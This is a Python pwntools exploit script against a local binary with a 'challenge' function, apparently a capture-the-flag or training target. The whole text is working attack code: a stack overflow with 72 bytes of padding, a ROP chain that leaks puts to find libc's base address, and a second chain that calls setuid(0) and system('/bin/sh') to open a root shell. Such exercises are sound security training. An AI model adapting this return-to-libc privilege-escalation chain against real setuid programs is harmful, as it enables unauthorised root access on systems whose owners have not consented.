from pwn import *

context.arch='amd64'
context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']
file = '/home/darkstar/Downloads/temp'

elf = ELF(file)
libc = ELF('/usr/lib64/libc.so.6')

puts_plt=elf.plt.get('puts')
puts_got=elf.got['puts']
print(puts_got)
challenge=elf.symbols['challenge']

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(challenge)

payload = b'A'*72
payload += rop.chain()

print("ROP 1")
print(rop.dump())

p = process(file)
#gdb.attach(p, '''
#    b *challenge+61
#    continue
#''')
p.recvuntil(b'###\n\n')

p.sendline(payload)

p.recvuntil(b"Leaving!\n")
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked puts: {hex(leaked_puts)}")

libc.address = leaked_puts - libc.symbols['puts']

system = libc.symbols['system']
setuid = libc.symbols['setuid']
Leaving = next(elf.search(b'Leaving!'))
binsh_addr = next(libc.search(b'/bin/sh'))

rop2 = ROP(elf)

rop2.raw(pop_rdi)
rop2.raw(0)
rop2.raw(setuid)
rop2.raw(pop_rdi)
rop2.raw(binsh_addr)
rop2.raw(system)

payload2 = b'A'*72
payload2 += rop2.chain()
#p.recvuntil(b'###\n\n')

p.sendline(payload2)

p.interactive()


